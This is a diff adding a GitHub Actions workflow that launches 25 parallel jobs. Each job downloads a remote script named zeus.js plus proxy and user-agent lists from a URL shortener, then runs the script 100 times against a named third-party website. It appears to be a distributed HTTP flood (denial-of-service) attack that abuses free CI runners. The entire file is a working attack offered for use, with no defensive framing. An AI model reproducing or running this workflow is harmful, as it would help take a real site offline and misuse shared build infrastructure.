@@ -1,0 +1,37 @@
+name: Ubuntu VDS 50 saniye zeus
+
+on:
+  workflow_dispatch:
+
+jobs:
+  vds:
+    runs-on: ubuntu-latest
+    strategy:
+      max-parallel: 25
+      matrix:
+        instance: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25]
+
+
+    steps:
+      - name: OK !
+        run: |
+          wget https://curl.by/wjk60/zeus.js
+          wget https://curl.by/UYgdD/fres.txt
+          wget https://curl.by/_m4jT/ua.txt
+          npm install fake-useragent colors
+          chmod +x zeus.js
+          PIDS=()
+          for i in {1..100}; do
+            timeout 85 node zeus.js https://hexbear.xyz/ 84 90 16
+            PIDS+=($!)
+          done
+          
+          for pid in "${PIDS[@]}"; do
+            wait $pid
+          done
+
+      - name: OK !
+        run: sleep 85
+        
+      - name: OK !
+        run: sudo reboot
